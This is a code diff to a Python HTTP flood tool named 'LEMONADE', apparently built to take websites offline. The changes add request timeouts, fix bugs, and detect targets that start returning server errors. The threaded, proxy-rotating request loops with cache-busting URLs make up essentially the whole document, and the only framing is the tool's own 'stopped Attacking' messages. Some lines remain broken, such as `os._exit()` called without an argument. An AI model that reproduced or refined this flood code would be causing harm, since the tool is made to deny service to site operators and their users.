@@ -5,7 +5,7 @@ import re
 import requests
 import sys
 import time
-
+import os
 
 
 with open("./config.json","r") as f:
@@ -99,7 +99,8 @@ class httpcall(threading.Thread):
         self.limiter = config["thread"]["limiter"]
         self.mindelay = int(config["thread"]["mindelay"]) / 1000
         self.maxdelay = int(config["thread"]["maxdelay"]) / 1000
-        self.method = str(config["method"]).lower
+        self.method = str(config["method"]).lower()
+        self.timeout = int(config["thread"]["timeout"])
         
         self.useproxies = config["useproxies"]
         self.limiter = config["thread"]["limiter"]
@@ -125,11 +126,19 @@ class httpcall(threading.Thread):
                             "Cache-Control": "no-cache",
                             "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                             "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                            "Keep-Alive": random.randint(110,120),
+                            "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload)
-                        if isignorestatus(lres.status_code):
+                        }, data=self.payload, timeout=self.timeout)
+                        proxies.append(proxy)
+                        if str(lres.status_code).startswith("50"):
+                            set_flag(1)
+                            print("Res 500 "+host[k])
+                            s = url[k]
+                            b = host[k]
+                            url.remove(s)
+                            host.remove(b)
+                        elif isignorestatus(lres.status_code):
                             requestcnt()
                         else:
                             print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
@@ -137,18 +146,6 @@ class httpcall(threading.Thread):
                             b = host[k]
                             url.remove(s)
                             host.remove(b)
-                            # set_flag(2)
-                    except requests.ConnectTimeout:
-                        pass
-                    except requests.HTTPError:
-                        set_flag(1)
-                        print("Res 500 "+host[k])
-                        s = url[k]
-                        b = host[k]
-                        url.remove(s)
-                        host.remove(b)
-                    except requests.URLRequired:
-                        sys.exit()
                     except:
                         pass
                 else:
@@ -158,15 +155,22 @@ class httpcall(threading.Thread):
                             "Cache-Control": "no-cache",
                             "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                             "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                            "Keep-Alive": random.randint(110,120),
+                            "Keep-Alive": str(random.randint(110,120)),
                             "Connection": "keep-alive",
                             "Host": host[k]
-                        }, data=self.payload,proxies={
+                        }, data=self.payload,timeout=self.timeout,proxies={
                             "http":"http://"+proxy,
                             "https":"http://"+proxy,
                         })
                         proxies.append(proxy)
-                        if isignorestatus(lres.status_code):
+                        if str(lres.status_code).startswith("50"):
+                            set_flag(1)
+                            print("Res 500 "+host[k])
+                            s = url[k]
+                            b = host[k]
+                            url.remove(s)
+                            host.remove(b)
+                        elif isignorestatus(lres.status_code):
                             requestcnt()
                         else:
                             print("A request error has occurred. StatusCode:"+lres.status_code+" "+host[k])
@@ -174,18 +178,6 @@ class httpcall(threading.Thread):
                             b = host[k]
                             url.remove(s)
                             host.remove(b)
-                            # set_flag(2)
-                    except requests.ConnectTimeout:
-                        pass
-                    except requests.HTTPError:
-                        set_flag(1)
-                        print("Res 500 "+host[k])
-                        s = url[k]
-                        b = host[k]
-                        url.remove(s)
-                        host.remove(b)
-                    except requests.URLRequired:
-                        sys.exit()
                     except:
                         pass
             if self.limiter == True:
@@ -204,7 +196,9 @@ class MonitorThread(threading.Thread):
         while True:
             global request_counter
             print(f"Summary Requested: {request_counter}")
-            time.sleep(15)
+            time.sleep(5)
+
+
 MonitorThread().start()
 for i in range(thrd):
     httpcall().start()
@@ -213,8 +207,8 @@ try:
         #print(f"Summary Requested: {request_counter}")
         if flag == 2:
             print("LEMONADE stopped Attacking")
-            sys.exit()
+            os._exit()
         time.sleep(0.05)
 except KeyboardInterrupt:
     print("LEMONADE stopped Attacking")
-    sys.exit()
+    os._exit()
